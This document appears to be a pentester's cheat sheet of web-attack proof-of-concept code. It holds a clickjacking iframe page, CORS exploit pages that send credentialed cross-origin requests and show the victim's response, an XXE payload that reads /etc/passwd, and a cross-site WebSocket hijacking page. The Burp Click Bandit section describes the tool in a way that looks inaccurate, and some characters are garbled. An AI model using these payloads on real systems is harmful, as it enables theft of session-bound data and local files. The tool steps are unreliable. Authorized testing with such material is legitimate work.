1. Testing for Clickjacking

<html>
    <head>
        <title>Clickjack test page</title>
    </head>
    <body>
        <iframe src="http://www.target.site" width="500" height="500"></iframe>
    </body>
</html>



2. Click Bandit

// How to use the Click Bandit feature in Burp Suite:Open Burp Suite: Launch the application and ensure you have the desired target web application set up in your proxy.
// Navigate to Click Bandit:Go to the "Extender" tab.
// Search for the Click Bandit extension and install it if you haven‚Äôt already.

Configure the Click Bandit:
// Once installed, you can find Click Bandit in the "Tools" menu.
// You can specify parameters such as the number of clicks, delay between clicks, and the type of requests (GET or POST).

Select Targets:
// Use the built-in browser to navigate to the target application.
// Identify the elements you want to interact with, such as buttons or links.

Start Clicking:
// Set up your click parameters, then start the Click Bandit.
// It will automatically simulate clicks based on your configurations.

Monitor Requests:
// Use the "HTTP history" tab to monitor the requests being sent and the responses from the server.
// This helps you identify any issues or vulnerabilities in how the application handles user interactions.

Adjust as Needed:
// Based on the results, you might want to tweak your settings or focus on different elements.


3. CORS

<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET", "https://example.com/", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
 
What it does:
Sends a cross-origin request to a vulnerable endpoint
Uses withCredentials = true to include cookies/session
Displays the response in a textarea ‚Äì perfect for proving sensitive data exposure

Cors poc code 

<html>
<head>
 <body>
 <center>
 <h2>CORS POC Exploit </h2>
 <h3>created by Asim-khan</h3>
</body>
</head>
<center>
<button onclick‚Äã="exploitCORS()">Fetch from the target!</button>
<hr size=1 width="80%">
<textarea id="fetchedResource" rows="10" cols="50" style="width:75%" placeholder="Click on the button to fetch resource!"></textarea>
</center>

<‚Äãscript>
function exploitCORS(){
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','vulnerable-url',true);
 req.withCredentials = true;
 req.send();
}

function reqListener(){
 document.getElementById("fetchedResource").value = this.responseText;
}
<‚Äã/script>
</html>


4. XXE 

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<client-message xmlns="http://www.karora.org/products/echo2/cli-msg">
  <message-part xmlns:processor="EchoPropertyUpdate">
    <property component-id="c_11" name="text">&xxe;</property>
  </message-part>
</client-message>



Orgin Check : Websocket orgin (cors)

<!DOCTYPE html>
<html>
  <body>
    <h2>CSWSH PoC</h2>
    <script>
      const ws = new WebSocket("wss://example.com");

      ws.onopen = function () {
        document.body.innerHTML += "<p style='color:green;'>‚úÖ WebSocket connected ‚Äî server did not reject evil origin</p>";
        ws.send("Test message from malicious origin");
      };

      ws.onerror = function () {
        document.body.innerHTML += "<p style='color:red;'>‚ùå Connection failed ‚Äî maybe origin is being checked</p>";
      };

      ws.onmessage = function (event) {
        document.body.innerHTML += `<p>üì® Server replied: ${event.data}</p>`;
      };
    </script>
  </body>
</html>

